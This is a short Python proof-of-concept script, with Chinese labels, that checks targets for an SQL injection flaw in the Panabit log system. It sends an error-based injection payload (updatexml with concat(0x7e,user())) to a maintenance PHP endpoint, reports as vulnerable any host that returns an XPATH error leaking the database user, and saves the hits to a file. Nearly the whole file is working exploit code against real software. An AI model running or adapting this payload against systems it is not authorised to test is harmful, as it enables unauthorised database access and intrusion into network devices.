import requests
import time
import buter
import wirtefile

info = "Panabit日志系统SQL注入漏洞"
filename = f"./reps/{info}-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
poc = '/Maintain/sprog_deletevent.php?openid=1&id=1 or updatexml(1,concat(0x7e,(user())),0)&cloudip=1'

def panabitlogsql(url):
    try:
        reps = requests.get(url=url + poc, headers=headers, verify=False, timeout=5)
        if reps.status_code == 200 and "XPATH syntax error" in reps.text:
            print(buter.colors.GREEN+  f"存在{info} url : {url} \nreponse : {reps.text}" + buter.colors.END)
            reptext = url + "\n" + reps.text
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现{info} url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
